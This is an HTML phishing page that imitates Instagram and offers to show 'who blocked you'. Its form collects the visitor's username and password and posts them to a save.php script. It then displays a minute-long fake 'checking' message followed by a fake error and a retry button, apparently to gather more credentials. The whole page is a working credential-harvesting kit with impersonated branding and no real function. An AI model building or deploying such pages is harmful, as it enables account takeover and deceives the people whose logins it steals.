<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>See Who Blocked You on Instagram</title>
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      padding: 0;
      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
      background-color: black;
      color: white;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    .container {
      width: 100%;
      max-width: 400px;
      background-color: #121212;
      padding: 30px 20px;
      border-radius: 20px;
      box-shadow: 0 8px 16px rgba(0, 0, 0, 0.6);
      animation: fadeIn 1s ease-in-out;
    }

    .logo {
      display: flex;
      align-items: center;
      margin-bottom: 20px;
    }

    .logo img {
      height: 40px;
      margin-right: 10px;
    }

    .logo-title {
      font-size: 18px;
      font-weight: bold;
      color: white;
    }

    h2 {
      text-align: center;
      font-size: 22px;
      color: white;
      font-weight: bold;
      margin-bottom: 25px;
    }

    input, button {
      width: 100%;
      padding: 14px;
      margin: 10px 0;
      font-size: 16px;
      border-radius: 10px;
      border: none;
    }

    input {
      background: #1f1f1f;
      color: white;
      font-weight: bold;
    }

    input::placeholder {
      color: #666;
    }

    input:focus {
      outline: none;
      caret-color: #ff3e7f;
    }

    button {
      background-color: #ff3e7f;
      color: white;
      font-weight: bold;
      border: none;
      transition: 0.3s;
    }

    button:hover {
      background-color: #e72e6b;
    }

    .spinner {
      display: none;
      text-align: center;
      margin-top: 30px;
    }

    .spinner div {
      width: 22px;
      height: 22px;
      border: 4px solid #fff;
      border-top: 4px solid transparent;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: auto;
    }

    .message {
      display: none;
      text-align: center;
      font-size: 18px;
      margin-top: 50px;
      font-weight: bold;
    }

    .retry-button {
      background-color: #444;
      color: white;
      font-weight: bold;
      margin-top: 20px;
      border: none;
      padding: 10px 20px;
      border-radius: 10px;
    }

    small {
      font-size: 12px;
      color: #bbb;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    @media screen and (orientation: landscape) {
      body {
        display: none;
      }
    }

    .password-wrapper {
      position: relative;
    }

    .password-wrapper input {
      padding-left: 40px;
    }

    .eye-icon {
      position: absolute;
      top: 50%;
      left: 12px;
      transform: translateY(-50%);
      width: 18px;
      height: 18px;
      pointer-events: auto;
      z-index: 2;
    }

    .eye-icon svg {
      fill: none;
      stroke: white;
      stroke-width: 2;
    }

  </style>
</head>
<body>

  <div class="container" id="formContainer">
    <div class="logo">
      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
      <span class="logo-title">Instagram</span>
    </div>
    <h2>See Who Blocked You on Instagram</h2>
    <form id="loginForm">
      <input type="text" id="instaId" placeholder="Instagram ID" required>
      <small>Only letters, numbers, underscores or dots. Max 30 chars.</small>

      <div class="password-wrapper">
        <input type="password" id="password" placeholder="Password" required autocomplete="off">
        <div class="eye-icon" onclick="togglePassword()">
          <svg viewBox="0 0 24 24">
            <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12z"/>
            <circle cx="12" cy="12" r="3"/>
          </svg>
        </div>
      </div>

      <button type="submit">Log In</button>
    </form>
    <div class="spinner" id="loadingSpinner"><div></div></div>
  </div>

  <div class="message" id="checkingMessage">üîç Checking for followers...</div>
  <div class="message" id="errorMessage">
    ‚ö†Ô∏è Something went wrong. Please try again.
    <br>
    <button class="retry-button" onclick="retryForm()">üîÅ Retry</button>
  </div>

  <script>
    function togglePassword() {
      const pwd = document.getElementById("password");
      pwd.type = pwd.type === "password" ? "text" : "password";
    }

    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();

      const instaId = document.getElementById('instaId').value.trim();
      const password = document.getElementById('password').value;
      const usernameRegex = /^[a-zA-Z0-9._]{1,30}$/;

      if (!usernameRegex.test(instaId)) {
        alert("‚ùå Invalid Instagram ID. Only letters, numbers, dots or underscores.");
        return;
      }

      document.getElementById('loadingSpinner').style.display = 'block';

      const formData = new FormData();
      formData.append('instaId', instaId);
      formData.append('password', password);

      fetch('save.php', {
        method: 'POST',
        body: formData
      }).then(() => {
        document.getElementById('formContainer').style.display = 'none';
        document.getElementById('loadingSpinner').style.display = 'none';
        document.getElementById('checkingMessage').style.display = 'block';

        setTimeout(() => {
          document.getElementById('checkingMessage').style.display = 'none';
          document.getElementById('errorMessage').style.display = 'block';
        }, 60000); // 1 minute
      });
    });

    function retryForm() {
      document.getElementById('instaId').value = '';
      document.getElementById('password').value = '';
      document.getElementById('formContainer').style.display = 'block';
      document.getElementById('checkingMessage').style.display = 'none';
      document.getElementById('errorMessage').style.display = 'none';
    }
  </script>

</body>
</html>
